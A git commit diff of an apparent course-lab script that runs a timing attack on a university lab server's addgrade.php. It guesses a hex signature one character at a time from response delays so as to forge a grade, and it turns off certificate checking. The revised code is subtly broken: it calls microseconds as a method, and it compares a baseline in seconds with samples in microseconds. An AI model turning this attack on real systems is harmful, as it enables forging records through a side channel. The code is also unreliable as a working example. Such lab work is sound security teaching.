5abf4fd3afd8eb9658c8d9fd023cc4b2c9598dc6
Sofi <sofi.flinck@gmail.com>
2019-12-16 01:19:36 +0100

    fin fix

--- Assignments HA4/Assignment 2/B2_Web_Attack.py
+++ Assignments HA4/Assignment 2/B2_Web_Attack.py
@@ -8,6 +8,9 @@ url_base = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+session = requests.Session()
+session.verify = False
+
 name = 'Kalle'
 grade = '5'
 signature = ''
@@ -16,30 +19,23 @@ parameters = {'name': name, 'grade': grade, 'signature': signature}
 
 base_values = []
 for j in range(10):
-    result = requests.get(url_base, params=parameters, verify=False)
-    base_values.append(result.elapsed.microseconds)
+    base_values.append(session.get(url_base, params=parameters, verify=False).elapsed.total_seconds())
 
 base_mean = mean(base_values)
 base_values.clear()
 
 for i in range(20):
-    print("i: ", i)
     for char in hex_array:
         signature += char
         parameters = {'name': name, 'grade': grade, 'signature': signature}
         for j in range(10):
-            result = requests.get(url_base, params=parameters, verify=False)
-            url = result.url
-            base_values.append(result.elapsed.microseconds)
-
-        print(url)
-        print(f"Base values for {char}:", mean(base_values), base_mean)
-        if mean(base_values) > base_mean + 2500:
+            base_values.append(session.get(url_base, params=parameters, verify=False).elapsed.microseconds())
+        if mean(base_values) > base_mean + 22000:
             finished_signature += char
-            print(finished_signature)
             base_mean = mean(base_values)
             base_values.clear()
             break
+        base_values.clear()
         signature = signature[:len(signature) - 1]
 
-print(''.join(finished_signature))
+print(finished_signature)
